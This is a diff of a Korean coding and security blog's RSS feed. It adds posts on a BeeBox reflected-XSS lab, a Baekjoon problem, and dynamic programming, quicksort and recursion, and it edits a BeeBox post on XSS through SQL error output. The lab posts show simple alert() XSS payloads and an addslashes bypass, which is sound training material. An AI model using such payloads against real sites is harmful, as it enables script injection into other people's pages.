@@ -9,8 +9,158 @@
     <atom:link href="https://lrtk-coder.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>Coding, Security, IT News 등 정리한 블로그</description>
-    <pubDate>Wed, 24 Feb 2021 02:24:55 GMT</pubDate>
+    <pubDate>Thu, 25 Feb 2021 17:12:32 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>XSS - Reflected (PHP_SELF)</title>
+      <link>https://lrtk-coder.github.io/2021/02/24/phpMyAdmin-BBCode-Tag-XSS/</link>
+      <guid>https://lrtk-coder.github.io/2021/02/24/phpMyAdmin-BBCode-Tag-XSS/</guid>
+      <pubDate>Wed, 24 Feb 2021 23:15:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;PHP-SELF&quot;&gt;&lt;a href=&quot;#PHP-SELF&quot; class=&quot;headerlink&quot; title=&quot;PHP_SELF&quot;&gt;&lt;/a&gt;PHP_SELF&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="PHP-SELF"><a href="#PHP-SELF" class="headerlink" title="PHP_SELF"></a>PHP_SELF</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]</span><br></pre></td></tr></table></figure><ul><li>현재 실행중인 파일(자신)의 경로 + 파일명을 담은 전역변수</li><li>웹에선 URL상의 경로가 출력됨.</li><li>CLI에서는 접근한 경로가 그대로 출력.</li></ul><h1 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="/images/pasted-227.png"></p><p>first name과 last name에 값을 넣으면 그대로 출력하는 페이지이다.</p><p>이를 이용하여 XSS 코드를 반영하겠다.</p><p><img src="/images/pasted-228.png" alt="`&amp;ltimg src=# onerror=alert(1)&amp;gt`/`aa`"></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p><img src="/images/pasted-229.png" alt="`&#39;&quot;&amp;\`/`aa`"></p><p><code>&#39;</code>, <code>&quot;</code>, <code>\</code>의 앞에 <code>\</code>가 추가된 값으로 이스케이프된 것을 볼 수 있다.</p><p>아마 addslashes() 함수로 입력값에 대한 이스케이프를 진행 한 것으로 추측이 된다.</p><p><img src="/images/pasted-228.png" alt="`&amp;ltimg src=# onerror=alert(1)&amp;gt`/`aa`"></p><p>이를 우회하기 위해선 Low Level의 방식처럼 <code>&#39;</code>, <code>&quot;</code>, <code>\</code>를 사용 안하는 방법으로 XSS 코드를 입력할 수 있다.</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p><img src="/images/pasted-230.png"></p><p>htmlspecialchars 함수로 특수문자가 HTML 엔티티로 이스케이프로 되어 XSS 코드가 제대로 반영이 안된 것을 볼 수 있다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/Security/Web/BeeBox/">BeeBox</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/BeeBox/">BeeBox</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/02/24/phpMyAdmin-BBCode-Tag-XSS/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>백준 브론즈4 15726번 문제</title>
+      <link>https://lrtk-coder.github.io/2021/02/24/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14935%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
+      <guid>https://lrtk-coder.github.io/2021/02/24/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14935%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
+      <pubDate>Wed, 24 Feb 2021 22:51:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;이칙연산&quot;&gt;&lt;a href=&quot;#이칙연산&quot; class=&quot;headerlink&quot; title=&quot;이칙연산&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.acmicpc.net/problem/15726&quot;&gt;이칙연산&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;다음과 같이 세 수</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="이칙연산"><a href="#이칙연산" class="headerlink" title="이칙연산"></a><a href="https://www.acmicpc.net/problem/15726">이칙연산</a></h1><p>다음과 같이 세 수가 연속해서 주어졌을 때 한 번의 곱셈 기호와 한 번의 나눗셈 기호를 이용하여 만든 식 중 가장 큰 값을 출력하는 프로그램을 작성하시오. (세 수의 순서는 변하지 않는다.)</p><p>32 ☐ 16 ☐ 8</p><h2 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">print(<span class="built_in">int</span>(<span class="built_in">max</span>(a*b/c, a/b*c)))</span><br></pre></td></tr></table></figure><h3 id="풀이-설명"><a href="#풀이-설명" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>문제의 요점은 3개의 숫자를 곱셈과 나누기를 이용해서 계산했을 때 어떻게 계산해야 가장 큰 수가 나오는지를 구하는 문제이다.</p><ol><li>숫자1 * 숫자2 / 숫자3</li><li>숫자1 / 숫자2 * 숫자3</li><li>1과 2의 결과값 크키 비교 후 큰 수 출력.</li></ol><p>여기서, 많이 헤매는 부분은 <code>//</code>, <code>/</code> 둘 중 어느 것을 써야하는지이다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()) <span class="comment"># 10 3 3 입력</span></span><br><span class="line">print(a*b/c, a/b*c)<span class="comment"># 10.0 10.0 출력</span></span><br><span class="line">print(a*b//c, a//b*c)<span class="comment"># 10 9 출력</span></span><br></pre></td></tr></table></figure><p><code>//</code>은 소수점을 버리기 때문에 값이 차이가 나는 것을 알 수 있다.</p><p>하지만 이 문제에서 왜 <code>/</code>을 쓰는지는 모르겠다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B8%8C%EB%A1%A0%EC%A6%884/">브론즈4</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/02/24/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14935%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>알고리즘 정리 - 동적 계획법, 분할 정복</title>
+      <link>https://lrtk-coder.github.io/2021/02/24/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EB%8F%99%EC%A0%81-%EA%B3%84%ED%9A%8D%EB%B2%95-%EB%B6%84%ED%95%A0-%EC%A0%95%EB%B3%B5/</link>
+      <guid>https://lrtk-coder.github.io/2021/02/24/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EB%8F%99%EC%A0%81-%EA%B3%84%ED%9A%8D%EB%B2%95-%EB%B6%84%ED%95%A0-%EC%A0%95%EB%B3%B5/</guid>
+      <pubDate>Wed, 24 Feb 2021 08:38:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;정의&quot;&gt;&lt;a href=&quot;#정의&quot; class=&quot;headerlink&quot; title=&quot;정의&quot;&gt;&lt;/a&gt;정의&lt;/h1&gt;&lt;h2 id=&quot;동적-계획법-Dynamic-Programming&quot;&gt;&lt;a href=&quot;#동적-계획법-Dynamic-Programming&quot;</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="정의"><a href="#정의" class="headerlink" title="정의"></a>정의</h1><h2 id="동적-계획법-Dynamic-Programming"><a href="#동적-계획법-Dynamic-Programming" class="headerlink" title="동적 계획법(Dynamic Programming)"></a>동적 계획법(Dynamic Programming)</h2><p>입력 크기가 작은 부분 문제들을 해결한 후, 해당 부분 문제의 해를 활용해서, 보다 큰 크기의 부분 문제를 해결, 최종적으로 전체 문제를 해결하는 알고리즘</p><p>상향식 접근법으로, 가장 최하위 해답을 구한 후, 이를 저장하고, 해당 결과값을 이용해서 상위 문제를 풀어가는 방식</p><p>Memoization 기법을 사용함.<br><br>Memoization이란? 프로그램 실행 시 이전에 계산한 값을 저장하여, 다시 계산하지 않도록 하여 전체 실행 속도를 빠르게 하는 기술</p><p>문제를 잘게 쪼갤 때, 부분 문제는 중복되어, 재활용됨.</p><h2 id="분할-정복"><a href="#분할-정복" class="headerlink" title="분할 정복"></a>분할 정복</h2><p>문제를 나눌 수 없을 때까지 나누어서 각각을 풀면서 다시 합병하여 문제의 답을 얻는 알고리즘</p><p>하양식 접근법으로, 상위의 해답을 구하기 위해, 아래로 내려가면서 하위의 해답을 구하는 방식</p><p>문제를 잘게 쪼갤 때, 부분 문제는 서로 중복되지 않음.</p><h2 id="공통점"><a href="#공통점" class="headerlink" title="공통점"></a>공통점</h2><p>문제를 잘게 쪼개서, 가장 작은 단위로 분할</p><h2 id="차이점"><a href="#차이점" class="headerlink" title="차이점"></a>차이점</h2><ul><li><p>동적 계획법<br><br>부분 문제는 중복되어, 상위 문제 해결 시 재활용됨.<br><br>Memoization 기법 사용(부분 문제의 해답을 저장해서 재활용하는 최적화 기법으로 사용)</p></li><li><p>분할 정복<br><br>부분 문제는 서로 중보되지 않음.<br><br>Memoization 기법 사용 안함.</p></li></ul><h2 id="이해"><a href="#이해" class="headerlink" title="이해"></a>이해</h2><h3 id="동적-계획법-알고리즘-이해"><a href="#동적-계획법-알고리즘-이해" class="headerlink" title="동적 계획법 알고리즘 이해"></a>동적 계획법 알고리즘 이해</h3><ol><li>피보나치 수열<br><img src="/images/pasted-225.png"></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fibonacci(0) &#x3D; 0</span><br><span class="line">fibonacci(1) &#x3D; 1</span><br><span class="line">fibonacci(2) &#x3D; 1</span><br><span class="line">fibonacci(3) &#x3D; 2</span><br><span class="line">fibonacci(4) &#x3D; 3</span><br><span class="line">fibonacci(5) &#x3D; 5</span><br><span class="line">fibonacci(6) &#x3D; 8</span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>Recursive call 활용</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibo</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">return</span> fibo(num - <span class="number">1</span>) + fibo(num - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">print(fibo(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>fibo(4)를 구하기 위해선 fibo(3)과 fibo(2)가 필요하다.</p><p>fibo(3)은 fibo(2) + fibo(1)<br><br>fibo(2)은 fibo(1) + fibo(0)</p><p>fibo(4)를 구하기 위해선 fibo(0) 1개, fibo(1) 2개, fibo(2) 1개가 필요한데 이를 계속 계산하여 구하는 것은 비효율적이다.</p><p>이 부분을 해결하는 방법이 동적 계획법이다.</p><figure class="highlight python"><figcaption><span>DP 활용</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibo_dp</span>(<span class="params">num</span>):</span></span><br><span class="line">    cache = [<span class="number">0</span> <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(num+<span class="number">1</span>)]</span><br><span class="line">    cache[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    cache[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, num+<span class="number">1</span>):</span><br><span class="line">        cache[index] = cache[index<span class="number">-1</span>] + cache[index<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">return</span> cache[num]</span><br><span class="line"></span><br><span class="line">print(fibo_dp(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>리스트에 피보나치 수열을 계산 값을 저장을 하여 저장된 값을 사용하여 계산하여 효율을 높였다.</p><h3 id="분할-정복-알고리즘-이해"><a href="#분할-정복-알고리즘-이해" class="headerlink" title="분할 정복 알고리즘 이해"></a>분할 정복 알고리즘 이해</h3><p>퀵 정렬 알고리즘 참고</p>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/Basic/">Basic</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/%EB%8F%99%EC%A0%81-%EA%B3%84%ED%9A%8D%EB%B2%95/">동적 계획법</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/%EB%B6%84%ED%95%A0-%EC%A0%95%EB%B3%B5/">분할 정복</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/02/24/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EB%8F%99%EC%A0%81-%EA%B3%84%ED%9A%8D%EB%B2%95-%EB%B6%84%ED%95%A0-%EC%A0%95%EB%B3%B5/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>알고리즘 정리 - 퀵 정렬</title>
+      <link>https://lrtk-coder.github.io/2021/02/24/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%ED%80%B5-%EC%A0%95%EB%A0%AC/</link>
+      <guid>https://lrtk-coder.github.io/2021/02/24/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%ED%80%B5-%EC%A0%95%EB%A0%AC/</guid>
+      <pubDate>Wed, 24 Feb 2021 00:13:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;퀵-정렬-Quick-Sort&quot;&gt;&lt;a href=&quot;#퀵-정렬-Quick-Sort&quot; class=&quot;headerlink&quot; title=&quot;퀵 정렬(Quick Sort)&quot;&gt;&lt;/a&gt;퀵 정렬(Quick Sort)&lt;/h1&gt;&lt;img src=&quot;https://m</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="퀵-정렬-Quick-Sort"><a href="#퀵-정렬-Quick-Sort" class="headerlink" title="퀵 정렬(Quick Sort)"></a>퀵 정렬(Quick Sort)</h1><img src="https://media.vlpt.us/images/rachell_lee/post/9d07118d-e83a-46c6-a1f9-7d667dbc09b5/quick_sort.gif"><p>기준점(pivot)을 정해서, 기준점보다 작은 데이터는 왼쪽(left), 큰 데이터는 오른쪽(right)으로 모으는 함수를 작성함.<br><br>각 왼쪽(left), 오른쪽(right)은 재귀용법을 사용해서 다시 동일 함수를 호출하여 위 작업을 반복함.<br><br>함수는 왼쪽(left) + 기준점(pivot) + 오른쪽(right)을 리턴함.</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qsort</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">    left, right = <span class="built_in">list</span>(), <span class="built_in">list</span>()</span><br><span class="line">    pivot = data[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> pivot &gt; data[index]:</span><br><span class="line">            left.append(data[index])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right.append(data[index])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> qsort(left) + [pivot] + qsort(right)</span><br><span class="line"></span><br><span class="line">data_list = random.sample(<span class="built_in">range</span>(<span class="number">100</span>), <span class="number">10</span>)</span><br><span class="line">print(qsort(data_list))</span><br></pre></td></tr></table></figure><h2 id="알고리즘-분석"><a href="#알고리즘-분석" class="headerlink" title="알고리즘 분석"></a>알고리즘 분석</h2><p>병합 정렬과 유사, 시간 복잡도는 O(n log n)</p><p>단, 최악의 경우 pivot이 가장 크거나 작으면 모든 데이터를와 비교하게 된다. O(n<sup>2</sup>)</p>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/Basic/">Basic</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/%EB%B6%84%ED%95%A0-%EC%A0%95%EB%B3%B5/">분할 정복</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/%ED%80%B5-%EC%A0%95%EB%A0%AC/">퀵 정렬</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/02/24/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%ED%80%B5-%EC%A0%95%EB%A0%AC/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>알고리즘 정리 - 재귀용법</title>
+      <link>https://lrtk-coder.github.io/2021/02/23/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%9E%AC%EA%B7%80%EC%9A%A9%EB%B2%95/</link>
+      <guid>https://lrtk-coder.github.io/2021/02/23/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%9E%AC%EA%B7%80%EC%9A%A9%EB%B2%95/</guid>
+      <pubDate>Tue, 23 Feb 2021 19:10:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;재귀-용법-Recursive-Call-재귀-호출&quot;&gt;&lt;a href=&quot;#재귀-용법-Recursive-Call-재귀-호출&quot; class=&quot;headerlink&quot; title=&quot;재귀 용법(Recursive Call, 재귀 호출)&quot;&gt;&lt;/a&gt;재귀 용법(</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="재귀-용법-Recursive-Call-재귀-호출"><a href="#재귀-용법-Recursive-Call-재귀-호출" class="headerlink" title="재귀 용법(Recursive Call, 재귀 호출)"></a>재귀 용법(Recursive Call, 재귀 호출)</h1><p>함수 안에서 동일한 함수를 호출하는 형태</p><h2 id="예제"><a href="#예제" class="headerlink" title="예제"></a>예제</h2><p>팩토리얼을 구하는 알고리즘</p><ul><li>2! = 1*2</li><li>3! = 1*2*3</li><li>4! = 1*2*3*4</li><li>n! = n * (n-1)!</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> num * factorial(num<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">print(factorial(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><p>시간 복잡도/공간 복잡도는 O(n-1)이므로, O(n)이라는 시간 복잡도/공간 복잡도를 가진다.</p><h2 id="일반적인-형태"><a href="#일반적인-형태" class="headerlink" title="일반적인 형태"></a>일반적인 형태</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursive</span>(<span class="params">입력</span>):</span></span><br><span class="line">    <span class="keyword">if</span> 입력 &gt; 일정값:</span><br><span class="line">        <span class="keyword">return</span> recursive(입력 또는 특정값)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> 결과값</span><br></pre></td></tr></table></figure><blockquote><p>파이썬의 경우 재귀함수의 길이는 1000번이 최대이다.</p></blockquote>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/Basic/">Basic</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/%EC%9E%AC%EA%B7%80%ED%95%A8%EC%88%98/">재귀함수</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/02/23/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98-%EC%A0%95%EB%A6%AC-%EC%9E%AC%EA%B7%80%EC%9A%A9%EB%B2%95/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>백준 브론즈4 14470번 문제</title>
@@ -47,7 +197,7 @@
       
       
       
-      <content:encoded><![CDATA[<h1 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="/images/pasted-219.png"></p><p>로그인을 해야하지만, bee 계정과 LRTK 계정으로 로그인이 안된다.</p><p>현 로그인의 계정 정보도 없어서, SQL Injection이 되는 지 확인을 해보았다.</p><p><img src="/images/pasted-221.png" alt="Login: `&#39;`"></p><p>SQL의 에러메시지가 그대로 출력되는 것을 확인할 수 있었다. 이것을 이용하여 입력한 XSS 코드가 페이지에 반영할 수 있을 것 같다.</p><p><img src="/images/pasted-222.png" alt="Login: `&lt;a&gt;hi&lt;/a&gt;&#39;`"></p><p>먼저 a태그를 넣어서 반영이 되는지 확인을 했는데 반영이 되는 것을 볼 수 있었다.</p><p><img src="/images/pasted-223.png" alt="Login: `&lt;script&gt;alert(1)&lt;/script&gt;&#39;`"></p><p>SQL 에러 메시지 출력을 막으면 될 거 같은데 Medium과 High에서 방어 방법을 알아 보겠다.</p><h2 id="Medium-amp-High"><a href="#Medium-amp-High" class="headerlink" title="Medium &amp; High"></a>Medium &amp; High</h2><p><img src="/images/pasted-224.png"></p><p>SQL 에러가 더이상 출력이 안된다. 더이상 XSS은 시도할 수 없을 것 같다.</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($_COOKIE[<span class="string">&quot;security_level&quot;</span>])&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;0&quot;</span> :</span><br><span class="line">    $data = no_check($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;1&quot;</span> :</span><br><span class="line">        $data = sqli_check_1($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;2&quot;</span> :</span><br><span class="line">        $data = sqli_check_2($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> :</span><br><span class="line">        $data = no_check($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><figcaption><span>sqli_check_1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_1</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addslashes 함수로 특정 특수 문자 앞에 <code>\</code>을 넣어서 이스케이프하였다.</p><figure class="highlight php"><figcaption><span>sqli_check_2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_2</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mysql_real_escape_string 함수를 이용하여 SQL에 사용되는 특수 문자 앞에 <code>\</code>을 넣어서 이스케이프 처리하였다.</p>]]></content:encoded>
+      <content:encoded><![CDATA[<h1 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="/images/pasted-219.png"></p><p>로그인을 해야하지만, bee 계정과 LRTK 계정으로 로그인이 안된다.</p><p>현 로그인의 계정 정보도 없어서, SQL Injection이 되는 지 확인을 해보았다.</p><p><img src="/images/pasted-221.png" alt="Login: `&#39;`"></p><p>SQL의 에러메시지가 그대로 출력되는 것을 확인할 수 있었다. 이것을 이용하여 입력한 XSS 코드가 페이지에 반영할 수 있을 것 같다.</p><p><img src="/images/pasted-222.png" alt="Login: `&amp;lta$gthi&amp;lt/a&amp;gt&#39;`"></p><p>먼저 a태그를 넣어서 반영이 되는지 확인을 했는데 반영이 되는 것을 볼 수 있었다.</p><p><img src="/images/pasted-223.png" alt="Login: `&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt&#39;`"></p><p>SQL 에러 메시지 출력을 막으면 될 거 같은데 Medium과 High에서 방어 방법을 알아 보겠다.</p><h2 id="Medium-amp-High"><a href="#Medium-amp-High" class="headerlink" title="Medium &amp; High"></a>Medium &amp; High</h2><p><img src="/images/pasted-224.png"></p><p>SQL 에러가 더이상 출력이 안된다. 더이상 XSS은 시도할 수 없을 것 같다.</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($_COOKIE[<span class="string">&quot;security_level&quot;</span>])&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;0&quot;</span> :</span><br><span class="line">    $data = 